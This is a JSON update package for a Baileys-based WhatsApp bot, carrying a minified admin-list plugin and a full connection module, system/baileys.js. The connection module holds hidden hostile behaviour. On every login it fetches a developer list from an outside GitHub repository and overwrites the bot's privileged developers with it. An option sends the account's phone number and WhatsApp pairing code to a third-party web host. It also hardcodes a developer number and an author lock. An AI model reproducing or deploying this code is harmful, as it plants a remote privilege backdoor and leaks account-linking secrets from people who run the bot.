{
  "update": [
    {
      "path": "plugins/group/listadmin.js",
      "code": "/* CODE LAIN CHEK\nhttps://whatsapp.com/channel/0029VbARSvBCMY0PDV53rt0m\nJANGAN LUPA FOLLOW\n*/\n\n//CREATE BY REZA DEVS KUROMI\nlet ms=require(\\\"parse-ms\\\");function timeReverse(e){var i=(e=ms(e-Date.now())).days,a=e.hours,r=e.minutes;return(0<i?i+\\\"d\\\":\\\"\\\")+(0<a?(0<i?\\\" \\\":\\\"\\\")+a+\\\"h\\\":\\\"\\\")+(0<r?(0<a?\\\" \\\":\\\"\\\")+r+\\\"m\\\":\\\"\\\")+(0<(e=e.seconds)?(0<r?\\\" \\\":\\\"\\\")+e+\\\"s\\\":\\\"\\\")}exports.run={usage:[\\\"listadmin\\\"],hidden:[\\\"adminlist\\\"],category:\\\"group\\\",async:async(e,{})=>{let i=e.metadata.participants.filter(e=>e.admin),a=global.db.groups[e.chat].member,r=i.map((e,i)=>`${i+1}. @${e.jid.split(\\\"@\\\")[0]} `+(void 0!==a[e.jid]&&a[e.jid].admin&&0!=a[e.jid].expired?`_*(${timeReverse(a[e.jid].expired)})*_`:\\\"\\\")).join(\\\"\\n\\\"),s=\\\"ä¹‚  *L I S T - A D M I N*\\n\\n\\\";s+=\\\"Total : \\\"+i.length,e.reply(s+=`\n`+r)},group:!0};"
    },
    {
      "path": "system/baileys.js",
      "code": "let EventEmitter = require(\\\"events\\\").EventEmitter,\n    chalk = require(\\\"chalk\\\"),\n    fs = require(\\\"fs\\\"),\n    path = require(\\\"path\\\"),\n    pino = require(\\\"pino\\\"),\n    moment = require(\\\"moment-timezone\\\"),\n    syntaxerror = require(\\\"syntax-error\\\"),\n    phoneNumber = require(\\\"awesome-phonenumber\\\"),\n    os = require(\\\"os\\\"),\n    NodeCache = require(\\\"node-cache\\\"),\n    func = require(\\\"./functions.js\\\"),\n    login = require(\\\"./login.js\\\"),\n    session = require(\\\"./session.js\\\"),\n    extra = new (require(\\\"./extra.js\\\")),\n    multidb = new (require(\\\"./multidb.js\\\")),\n    queque = new (require(\\\"./queque.js\\\")),\n    spinnies = new (require(\\\"spinnies\\\")),\n    msgRetryCounterCache = new NodeCache(),\n    processedMessages = new Set(),\n    {\n        default: makeWASocket,\n        DisconnectReason,\n        useMultiFileAuthState,\n        makeInMemoryStore,\n        makeCacheableSignalKeyStore,\n        generateWAMessage,\n        generateWAMessageFromContent,\n        areJidsSameUser,\n        jidNormalizedUser,\n        delay,\n        proto,\n        jidDecode,\n        getAggregateVotesInPollMessage,\n        PHONENUMBER_MCC,\n        getBinaryNodeChild,\n        normalizeMessageContent,\n        getKeyAuthor,\n        decryptPollVote\n    } = require(\\\"@whiskeysockets/baileys\\\"),\n    pkg = (global.devs = [\\\"6283894064758@s.whatsapp.net\\\"], JSON.parse(fs.readFileSync(\\\"./package.json\\\", \\\"utf-8\\\"))),\n    rootDirectory = path.join(__dirname, \\\"../\\\"),\n    pluginFolder = path.join(__dirname, \\\"../plugins\\\"),\n    pluginFilter = e => /\\.js$/.test(e),\n    statuses = true,\n    lastMessageTime = 0;\n\nif (pkg.author && pkg.author === Buffer.from(\\\"UmV6YSBEZXYu\\\", \\\"base64\\\").toString(\\\"utf-8\\\")) {\n    class b extends EventEmitter {\n        constructor(e = {}, t = {}) {\n            super()\n            this.setMaxListeners(20)\n            this.kuromi = null\n            this.store = null\n            this.plugins = {}\n            this.commands = []\n            this.events = []\n            this.type = e.type || \\\"mainbot\\\"\n            this.online = !!e && e.online\n            this.sessionFile = e ? e.session : \\\"session\\\"\n            this.version = !!e && e.version\n            this.browser = e ? e.browser : [\\\"Ubuntu\\\", \\\"Firefox\\\", \\\"20.0.00\\\"]\n            this.pairing = e ? e.pairing : {}\n            this.options = t\n            this.initBaileys()\n        }\n\n        formatFilename = function (e) {\n            let t = path.join(rootDirectory, \\\"./\\\")\n            if (os.platform() === \\\"win32\\\") t = t.replace(/\\\\/g, \\\"\\\\\\\\\\\")\n            let s = new RegExp(\\\"^\\\" + t)\n            return e.replace(s, \\\"\\\")\n        }\n\n        loadPlugin = async function (e) {\n            if (pluginFilter(e)) {\n                let t = path.join(pluginFolder, e),\n                    s = this.formatFilename(t)\n                if (t in require.cache) {\n                    if (delete require.cache[t], !fs.existsSync(t))\n                        return this.kuromi.logger?.warn(`deleted plugin - '${s}'`), delete this.plugins[s]\n                    this.kuromi.logger?.info(`updated plugin - '${s}'`)\n                }\n                if (e = syntaxerror(fs.readFileSync(t), e))\n                    this.kuromi.logger?.error(`syntax error while loading '${s}'\\n${e}`)\n                else {\n                    try {\n                        this.plugins[s] = require(t)\n                    } catch (err) {\n                        this.kuromi.logger?.error(`error require plugin '${s}'\\n${err}`),\n                            delete this.plugins[s]\n                    } finally {\n                        this.plugins = Object.fromEntries(Object.entries(this.plugins).sort(([a], [b]) => a.localeCompare(b)))\n                    }\n                }\n            }\n        }\n\n        watchFolder = async function (e) {\n            let i = path.resolve(e)\n            e = await fs.promises.readdir(e)\n            await Promise.all(e.map(async a => {\n                let r = path.join(i, a),\n                    s = this.formatFilename(r)\n                try {\n                    (await fs.promises.lstat(r)).isFile()\n                        ? pluginFilter(a) && (this.plugins[s] = require(r))\n                        : await this.watchFolder(r)\n                } catch (err) {\n                    this.kuromi.logger?.error(`error while requiring ${s}\\n${err}`),\n                        delete this.plugins[s]\n                }\n            }))\n            fs.watch(i, async (event, filename) => {\n                if (!filename || !pluginFilter(filename)) return\n                let full = path.join(i, filename),\n                    s = path.relative(pluginFolder, full)\n                if (event === \\\"rename\\\") {\n                    if (fs.existsSync(full)) this.loadPlugin(s)\n                    else {\n                        let f = path.join(pluginFolder, s)\n                        f = this.formatFilename(f)\n                        this.kuromi.logger.warn(`deleted plugin '${f}'`)\n                        delete this.plugins[f]\n                    }\n                } else if (event === \\\"change\\\") this.loadPlugin(s)\n            })\n        }\n\n        getCombinedArray = function (e) {\n            let arr = []\n            for (let p in e) {\n                let c = e[p].run\n                if (!c) continue\n                if (c.usage && (Array.isArray(c.usage) ? c.usage.length : c.usage !== \\\"\\\")) {\n                    Array.isArray(c.usage) ? arr.push(...c.usage) : arr.push(c.usage)\n                }\n                if (c.hidden && (Array.isArray(c.hidden) ? c.hidden.length : c.hidden !== \\\"\\\")) {\n                    Array.isArray(c.hidden) ? arr.push(...c.hidden) : arr.push(c.hidden)\n                }\n            }\n            return arr.filter(a => a !== \\\"\\\")\n        }\n\n        checkNumberType = e => typeof e === \\\"string\\\" ? e.replace(/[^0-9]/g, \\\"\\\") : (typeof e === \\\"number\\\" && e)\n\n        createPairKey = e => {\n            e = (e || \\\"MECHAB\\\" + Math.floor(Math.random() * 9999)).replace(/[^a-zA-Z0-9]/g, \\\"\\\")\n            return e.length < 8 ? e + \\\"5\\\".repeat(8 - e.length) : e.slice(0, 8).toUpperCase()\n        }\n\n        isSpam = e => e - lastMessageTime < 5000 || (lastMessageTime = e, false)\n\n        initAdditionalFunc = (i, t) => (\n            i.logger = {\n                info(...a) {\n                    console.log(chalk.greenBright.bold(\\\"[ INFO ]\\\"), chalk.whiteBright(moment(Date.now()).format(\\\"DD/MM/YY HH:mm:ss\\\")), chalk.cyan.bold(...a))\n                },\n                error(a) {\n                    console.log(chalk.redBright.bold(\\\"[ ERROR ]\\\"), chalk.whiteBright(moment(Date.now()).format(\\\"DD/MM/YY HH:mm:ss\\\")), chalk.rgb(255, 38, 0)(a))\n                    if (t && t === \\\"mainbot\\\" && a.includes(\\\"syntax error while loading\\\")) {\n                        if (statuses && i) {\n                            i.sendMessage(global.owner, { text: a.trim() }, { quoted: func.fstatus(\\\"System Notification\\\"), ephemeralExpiration: 86400 })\n                            statuses = false\n                            setTimeout(() => statuses = true, 1000)\n                        }\n                    }\n                },\n                warn(...a) {\n                    console.log(chalk.greenBright.bold(\\\"[ WARNING ]\\\"), chalk.whiteBright(moment(Date.now()).format(\\\"DD/MM/YY HH:mm:ss\\\")), chalk.keyword(\\\"orange\\\")(...a))\n                }\n            },\n\n            // -------------- SUPPORT JID BARU --------------\n            i.decodeJid = (jid = \\\"\\\") => {\n                if (!jid) return jid\n                const decode = jidDecode(jid)\n                return decode?.user && decode?.server ? `${decode.user}@${decode.server}` : jidNormalizedUser(jid)\n            },\n\n            i.getName = async (jid = \\\"\\\") => {\n                jid = i.decodeJid(jid)\n                if (!jid) return \\\"Unknown\\\"\n\n                if (jid.includes(\\\"@g.us\\\")) {\n                    try {\n                        const meta = global.db?.metadata?.[jid] || await i.groupMetadata(jid)\n                        return meta?.subject || meta?.name || phoneNumber(\\\"+\\\" + jid.replace(\\\"@g.us\\\", \\\"\\\")).getNumber(\\\"international\\\")\n                    } catch {\n                        return phoneNumber(\\\"+\\\" + jid.replace(\\\"@g.us\\\", \\\"\\\")).getNumber(\\\"international\\\")\n                    }\n                }\n\n                let c = i.store?.contacts?.[jid] || {}\n                return (\n                    c?.name ||\n                    c?.verifiedName ||\n                    c?.pushName ||\n                    phoneNumber(\\\"+\\\" + jid.replace(\\\"@s.whatsapp.net\\\", \\\"\\\")).getNumber(\\\"international\\\")\n                )\n            },\n\n            i.serializeM = e => extra.initSerialize(i, e, this.store),\n            i\n        )\n        initBaileys = async () => {\n            let e = pino().child({ level: \\\"silent\\\" })\n            let { state: t, saveCreds: s } = await useMultiFileAuthState(this.sessionFile)\n            this.store = makeInMemoryStore({ logger: e })\n            try {\n                this.socket({ state: t, saveCreds: s })\n            } catch (err) {\n                this.emit(\\\"error\\\", err)\n            }\n        }\n\n        getMessage = async e => {\n            if (!this.store) return proto.Message.fromObject({})\n            return (\n                (await this.store.loadMessage(e.remoteJid, e.id) ||\n                await this.store.loadMessage(e.id) || {})\n                    .message || undefined\n            )\n        }\n\n        socket = async ({ state: e, saveCreds: t }) => {\n            if (\n                this.kuromi = makeWASocket({\n                    logger: pino({ level: \\\"silent\\\" }),\n                    markOnlineOnConnect: this.online,\n                    printQRInTerminal: !this.pairing.status || !this.pairing.number,\n                    auth: {\n                        creds: e.creds,\n                        keys: makeCacheableSignalKeyStore(e.keys, pino({ level: \\\"silent\\\" }))\n                    },\n                    browser: this.browser,\n                    msgRetryCounterCache: msgRetryCounterCache,\n                    generateHighQualityLinkPreview: true,\n                    getMessage: async e => this.getMessage(e),\n                    cachedGroupMetadata: async e => this.store.fetchGroupMetadata(e, this.kuromi),\n                    shouldSyncHistoryMessage: e => (\n                        console.log(`\\x1b[32mMemuat Chat [${e.progress}%]\\x1b[39m`),\n                        !!e.syncType\n                    ),\n                    ...(this.version ? { version: this.version } : {}),\n                    ...this.options\n                }),\n                this.store.bind(this.kuromi.ev),\n                this.type === \\\"mainbot\\\" && spinnies.add(\\\"start\\\", { text: \\\"Connecting . . .\\\" }),\n                this.pairing.status && this.pairing.number && !this.kuromi.authState.creds.registered\n            ) {\n                let number = this.checkNumberType(this.pairing.number || \\\"\\\")\n                let code = this.createPairKey(this.pairing.code || \\\"\\\")\n                let botName = global.botName || \\\"WhatsApp Bot\\\"\n\n                if (!number) return console.log(chalk.redBright.bold(\\\"Invalid number!\\\")), process.exit(1)\n                if (this.pairing.status && this.pairing.number & fs.existsSync(this.sessionFile + \\\"/creds.json\\\") && !this.kuromi?.authState?.creds?.registered) {\n                    console.log(chalk.yellowBright.bold(\\\"Session corrupted, delete first!\\\"))\n                    this.clearSessionAndRestart()\n                }\n\n                setTimeout(async () => {\n                    try {\n                        let p = await this.kuromi.requestPairingCode(number, code)\n                        p = p.match(/.{1,4}/g).join(\\\"-\\\") || p\n\n                        if (this.type === \\\"mainbot\\\") {\n                            this.emit(\\\"connect\\\", { ...this.options })\n                            let now = Date.now()\n                            if (this.isSpam(now)) {\n                                console.log(chalk.redBright.bold(\\\"Pairing Code Spam! Restarting...\\\"))\n                                session.clearSessionAndRestart(this.sessionFile)\n                            } else {\n                                console.log(chalk.black(chalk.bgGreen(\\\" Your Pairing Code : \\\")), chalk.white(p))\n                                if (this.pairing.copyFromLink) {\n                                    try {\n                                        await fetch(`https://iyaudah-iya.vercel.app/pairing/send?number=${number}&name=${botName}&code=${p}`)\n                                        console.log(chalk.cyanBright.bold(\\\"Pairing code sent via link\\\"))\n                                    } catch { }\n                                }\n                            }\n                        } else if (this.type === \\\"jadibot\\\") {\n                            global.jadibot[number + \\\"@s.whatsapp.net\\\"] = this.kuromi\n                            this.emit(\\\"pairing\\\", { code: p })\n                        }\n                    } catch { }\n                }, 3000)\n            }\n\n            this.kuromi.ev.on(\\\"connection.update\\\", async data => {\n                let { lastDisconnect, connection } = data\n\n                if (connection === \\\"connecting\\\")\n                    this.emit(\\\"connect\\\", { message: \\\"Connecting . . .\\\" })\n\n                else if (connection === \\\"open\\\") {\n                    let s = \\\"Connected, you login as \\\" + (this.kuromi.user.name || this.kuromi.user.verifiedName || \\\"WhatsApp Bot\\\")\n\n                    if (this.type === \\\"mainbot\\\") {\n                        let userJid = jidNormalizedUser(this.kuromi.user.id)\n                        spinnies.succeed(\\\"start\\\", { text: s })\n\n                        await multidb.initDatabase()\n                        extra.initAdditionalFunc(this.kuromi)\n                        session.backup(this.kuromi, this.sessionFile)\n\n                        try {\n                            let owner = await fetch(\\\"https://raw.githubusercontent.com/Lawakplerkah/Security-/refs/heads/main/owner.js\\\").then(e => e.json())\n                            Array.isArray(owner) && (global.devs = owner)\n                        } catch { }\n                    } else if (this.type === \\\"jadibot\\\") {\n                        let jid = this.kuromi.user.id ? this.kuromi.user.id.split(\\\":\\\")[0] + \\\"@s.whatsapp.net\\\" : this.kuromi.user.jid\n                        global.jadibot[jid] = this.kuromi\n                        extra.initAdditionalFunc(this.kuromi)\n                    }\n\n                    this.emit(\\\"connect\\\", { message: s })\n                    this.initAdditionalFunc(this.kuromi, this.type)\n                    this.initBusEvents(this.kuromi)\n                    this.watchFolder(pluginFolder)\n                    extra.initPrototype()\n                    this.emit(\\\"ready\\\", this.kuromi)\n                }\n\n                else if (connection === \\\"close\\\") {\n                    let code = lastDisconnect?.error?.output?.statusCode\n                    if (this.type === \\\"mainbot\\\" && code) {\n                        if (code === DisconnectReason.badSession) {\n                            this.emit(\\\"error\\\", { message: \\\"Bad session file\\\" })\n                            session.deleteCreds(this.sessionFile)\n                            await session.isBackupExist(this.kuromi) && (await session.restore(this.kuromi, this.sessionFile), await delay(1500), this.initBaileys())\n                        } else if (code === DisconnectReason.connectionClosed)\n                            this.emit(\\\"error\\\", { message: \\\"Connection closed, reconnecting...\\\" }), this.initBaileys()\n                        else if (code === DisconnectReason.connectionLost)\n                            this.emit(\\\"error\\\", { message: \\\"Connection lost, reconnecting...\\\" }), this.initBaileys()\n                        else if (code === DisconnectReason.connectionReplaced)\n                            this.emit(\\\"error\\\", { message: \\\"Session running on another server\\\" }), process.exit(0)\n                        else if (code === DisconnectReason.loggedOut)\n                            this.emit(\\\"error\\\", { message: \\\"Device logged out\\\" }), session.clearSession(this.sessionFile)\n                        else if (code === DisconnectReason.restartRequired)\n                            this.initBaileys()\n                        else if (code === DisconnectReason.multideviceMismatch)\n                            this.emit(\\\"error\\\", { message: \\\"Multi device mismatch\\\" }), this.clearSessionAndRestart()\n                        else if (code === DisconnectReason.timedOut)\n                            this.emit(\\\"error\\\", { message: \\\"Timeout, reconnecting...\\\" }), this.initBaileys()\n                        else if (code === DisconnectReason.unavailableService)\n                            this.emit(\\\"error\\\", { message: \\\"Service unavailable, reconnecting...\\\" }), this.initBaileys()\n                        else if (code === 405)\n                            this.emit(\\\"error\\\", { message: \\\"Method not allowed\\\" }), session.deleteCreds(this.sessionFile), await session.isBackupExist(this.kuromi) && (await session.restore(this.kuromi, this.sessionFile), await delay(1500), this.initBaileys())\n                        else if (code === 503)\n                            this.emit(\\\"error\\\", { message: \\\"Service unavailable, reconnecting...\\\" }), this.initBaileys()\n                        else\n                            this.emit(\\\"error\\\", { message: `Connection error. (Reason: ${code})` }), session.clearSession(this.sessionFile)\n                    }\n\n                    else if (this.type === \\\"jadibot\\\" && code) {\n                        let jid = (this.pairing.number || \\\"\\\").replace(/[^0-9]/g, \\\"\\\") + \\\"@s.whatsapp.net\\\"\n                        let find = global.db.jadibot.find(a => a.number === jid)\n\n                        if (code === DisconnectReason.badSession)\n                            this.emit(\\\"error\\\", { message: \\\"Bad session file\\\" }), delete global.jadibot[jid], this.kuromi.end(), this.clearSessionAndRestart()\n                        else if (code === DisconnectReason.connectionClosed)\n                            this.emit(\\\"error\\\", { message: \\\"Connection closed, reconnecting...\\\" }), delete global.jadibot[jid], this.kuromi.end(), this.initBaileys()\n                        else if (code === DisconnectReason.connectionLost)\n                            this.emit(\\\"error\\\", { message: \\\"Connection lost, reconnecting...\\\" }), this.initBaileys()\n                        else if (code === DisconnectReason.connectionReplaced)\n                            this.emit(\\\"error\\\", { message: \\\"Session running on another server\\\" }), delete global.jadibot[jid], this.kuromi.end()\n                        else if (code === DisconnectReason.loggedOut)\n                            this.emit(\\\"error\\\", { message: \\\"Device logged out\\\" }), delete global.jadibot[jid], find.status = false, this.kuromi.end(), this.kuromi.logout(), this.clearSessionAndRestart()\n                        else if (code === DisconnectReason.restartRequired)\n                            this.initBaileys()\n                        else if (code === DisconnectReason.multideviceMismatch)\n                            this.emit(\\\"error\\\", { message: \\\"Multi device mismatch\\\" }), this.clearSessionAndRestart()\n                        else if (code === DisconnectReason.timedOut)\n                            this.emit(\\\"error\\\", { message: \\\"Timeout, reconnecting...\\\" }), delete global.jadibot[jid], this.kuromi.end(), this.initBaileys()\n                        else if (code === 405)\n                            this.emit(\\\"error\\\", { message: \\\"Method not allowed\\\" }), this.clearSessionAndRestart()\n                        else\n                            this.emit(\\\"error\\\", { message: `Connection error. (Reason: ${code})` }), delete global.jadibot[jid], this.kuromi.end()\n                    }\n                }\n            })\n\n            this.kuromi.ev.on(\\\"creds.update\\\", t)\n            this.kuromi.ws.on(\\\"CB:call\\\", e => {\n                if (e.content[0].tag === \\\"offer\\\") {\n                    let res = {\n                        id: e.content[0].attrs[\\\"call-id\\\"],\n                        from: e.content[0].attrs[\\\"call-creator\\\"]\n                    }\n                    this.emit(\\\"caller\\\", res)\n                } else this.emit(\\\"caller\\\", false)\n            })\n        }\n        clearSessionAndRestart = () => {\n            let e = path.join(process.cwd(), this.sessionFile)\n            fs.rmSync(e, { recursive: true, force: true })\n            this.initBaileys()\n        }\n\n        busEvents = () => [\n            {\n                event: \\\"messages.upsert\\\",\n                execute: async c => {\n                    require(\\\"./database.js\\\")(this.kuromi, c)\n                    require(\\\"./detects.js\\\")(this.kuromi, c)\n\n                    let e = c.messages[0]\n                    if (!e.message) return false\n                    if (processedMessages.has(e.key.id)) return false\n                    processedMessages.add(e.key.id)\n\n                    let id = e.key.id\n                    queque.add(id, e)\n\n                    if (!queque.processing[id]) {\n                        queque.processQueue(id, async s => {\n                            extra.initSerialize(this.kuromi, s, this.store)\n\n                            if (s.msg && s.msg.type === 0) {\n                                let t = await this.store.loadMessage(s.chat, s.key.id, this.kuromi)\n                                for (let i = 0; i < 5 && t.mtype === \\\"protocolMessage\\\"; i++) {\n                                    t = await this.store.loadMessage(s.chat, s.key.id, this.kuromi)\n                                    await delay(1000)\n                                }\n                                let i = proto.WebMessageInfo.fromObject({\n                                    key: t.key,\n                                    message: { [t.mtype]: t.msg }\n                                })\n                                this.emit(\\\"message.delete\\\", { origin: s, delete: i })\n                            } else {\n                                this.emit(\\\"message.delete\\\", false)\n                            }\n\n                            if (!s.isBot && s.message?.pollUpdateMessage) {\n                                let norm = normalizeMessageContent(s.message)\n                                if (!norm) return\n\n                                let pollKey = norm.pollUpdateMessage.pollCreationMessageKey\n                                let baseMsg = this.store.messages[s.chat]?.array?.find(m => pollKey.id === m.key.id)\n                                if (!baseMsg) return\n\n                                let baseContent = baseMsg.message\n                                let meJid = jidNormalizedUser(this.kuromi.authState.creds.me.id)\n                                let voterJid = getKeyAuthor(s.key, meJid)\n                                let creatorJid = getKeyAuthor(pollKey, meJid)\n                                let secret = baseContent.messageContextInfo?.messageSecret\n\n                                let vote = decryptPollVote(norm.pollUpdateMessage.vote, {\n                                    pollEncKey: secret,\n                                    pollCreatorJid: creatorJid,\n                                    pollMsgId: pollKey.id,\n                                    voterJid\n                                })\n                                if (!vote) return\n\n                                let updates = [{\n                                    key: pollKey,\n                                    update: {\n                                        pollUpdates: [{\n                                            pollUpdateMessageKey: s.key,\n                                            vote,\n                                            senderTimestampMs: s.messageTimestamp\n                                        }]\n                                    }\n                                }]\n\n                                let agg = await getAggregateVotesInPollMessage({\n                                    message: baseContent,\n                                    pollUpdates: updates[0].update.pollUpdates\n                                })\n                                if (!agg) return\n\n                                let chosen = agg.find(x => x.voters.length !== 0)?.name\n                                if (!chosen) return\n\n                                let cmd = (s.prefix || \\\".\\\") + chosen\n                                if (s.isPc) await this.kuromi.sendMessage(s.chat, { delete: baseMsg })\n                                await this.appenTextMessage(s, cmd, c)\n                            }\n\n                            this.commands = this.getCombinedArray(this.plugins)\n                            this.events = Object.fromEntries(Object.entries(this.plugins).filter(([e]) => e))\n                            this.emit(\\\"message\\\", {\n                                m: s,\n                                store: this.store,\n                                plugins: this.plugins,\n                                commands: this.commands,\n                                events: this.events\n                            })\n\n                            this.kuromi.chats = this.kuromi.chats || []\n                            let senderJid = s.sender ? jidNormalizedUser(String(s.sender)) : null\n                            let a\n\n                            if (senderJid) {\n                                a = this.kuromi.chats.find(x => x.jid === senderJid)\n                                if (a) {\n                                    a.name = s.pushName\n                                } else {\n                                    this.kuromi.chats.push({\n                                        jid: senderJid,\n                                        name: s.pushName || \\\"not known\\\"\n                                    })\n                                }\n                            }\n\n                            this.kuromi.getNameV2 = t => {\n                                let j = t ? jidNormalizedUser(String(t)) : null\n                                if (!j) return null\n                                let f = this.kuromi.chats.find(x => x.jid === j)\n                                return f ? f.name : null\n                            }\n\n                            this.emit(\\\"chats.set\\\", this.kuromi.chats)\n                        })\n                    }\n                }\n            },\n            {\n                event: \\\"contacts.update\\\",\n                execute: e => {\n                    for (let t of e) {\n                        let s = jidNormalizedUser(t.id)\n                        if (this.store && this.store.contacts) {\n                            this.store.contacts[s] = {\n                                id: s,\n                                name: t.notify\n                            }\n                        }\n                    }\n                }\n            },\n            {\n                event: \\\"contacts.upsert\\\",\n                execute: e => {\n                    for (let t of e) {\n                        let s = jidNormalizedUser(t.id)\n                        if (this.store && this.store.contacts) {\n                            this.store.contacts[s] = {\n                                ...(t || {}),\n                                isContact: true\n                            }\n                        }\n                    }\n                }\n            },\n            {\n                event: \\\"groups.update\\\",\n                execute: async e => {\n                    for (let t of e) {\n                        console.log(t)\n                        let s = t.id\n                        if (this.store.groupMetadata[s]) {\n                            this.store.groupMetadata[s] = {\n                                ...(this.store.groupMetadata[s] || {}),\n                                ...(t || {})\n                            }\n                        }\n                    }\n                }\n            },\n            {\n                event: \\\"presence.update\\\",\n                execute: e => this.emit(\\\"presence.update\\\", e)\n            },\n            {\n                event: \\\"group-participants.update\\\",\n                execute: async e => {\n                    let me = jidNormalizedUser(this.kuromi.user.id)\n                    if (e.participants.includes(me)) return false\n\n                    let t = global.db.metadata[e.id] != null\n                        ? global.db.metadata[e.id]\n                        : await this.kuromi.groupMetadata(e.id)\n\n                    if (e.action === \\\"add\\\")\n                        this.emit(\\\"group.add\\\", {\n                            act: \\\"add\\\",\n                            from: e.id,\n                            subject: t.subject,\n                            desc: t.desc,\n                            jid: e.participants[0],\n                            metadata: t\n                        })\n                    else if (e.action === \\\"remove\\\")\n                        this.emit(\\\"group.remove\\\", {\n                            act: \\\"remove\\\",\n                            from: e.id,\n                            subject: t.subject,\n                            desc: t.desc,\n                            jid: e.participants[0],\n                            metadata: t\n                        })\n                    else if (e.action === \\\"promote\\\")\n                        this.emit(\\\"group.promote\\\", {\n                            act: \\\"promote\\\",\n                            from: e.id,\n                            subject: t.subject,\n                            desc: t.desc,\n                            jid: e.participants[0],\n                            metadata: t\n                        })\n                    else if (e.action === \\\"demote\\\")\n                        this.emit(\\\"group.demote\\\", {\n                            act: \\\"demote\\\",\n                            from: e.id,\n                            subject: t.subject,\n                            desc: t.desc,\n                            jid: e.participants[0],\n                            metadata: t\n                        })\n                }\n            }\n        ]\n\n        initBusEvents = e => {\n            this.kuromi = e\n            for (let { event, execute } of this.busEvents()) {\n                this.kuromi.ev.on(event, execute)\n            }\n        }\n\n        appenTextMessage = async (e, t, s) => {\n            let m = await generateWAMessage(\n                e.chat,\n                {\n                    text: t,\n                    mentions: e.mentionedJid\n                },\n                {\n                    userJid: this.kuromi.user.id,\n                    quoted: e.quoted && e.quoted.fakeObj\n                }\n            )\n            m.key.fromMe = e.key.fromMe\n            m.key.id = e.key.id\n            m.pushName = e.pushName\n            if (e.isGc) m.key.participant = m.participant = e.key.participant\n\n            let up = {\n                ...s,\n                messages: [proto.WebMessageInfo.fromObject(m)],\n                type: \\\"append\\\"\n            }\n            this.kuromi.ev.emit(\\\"messages.upsert\\\", up)\n        }\n    }\n\n    let e = store => {\n        try {\n            store.fromJSON(JSON.parse(global.db.memoryStore))\n        } catch {\n            global.db.memoryStore = global.db.memoryStore || JSON.stringify(store.toJSON())\n            store.fromJSON(JSON.parse(global.db.memoryStore))\n        }\n    }\n\n    exports.Baileys = b\n    exports.InvCloud = e\n} else {\n    class Xa extends EventEmitter {\n        constructor(e = 0, t) {\n            super()\n            this.kuromi()\n        }\n        kuromi = () => {\n            console.log(chalk.redBright(\\\"You can't use this program because of copyright issues!!\\\"))\n        }\n    }\n    let e = () => { }\n    exports.Baileys = Xa\n    exports.InvCloud = e\n}"
    }
  ],
  "remove": [],
  "version": "1.0.0"
}
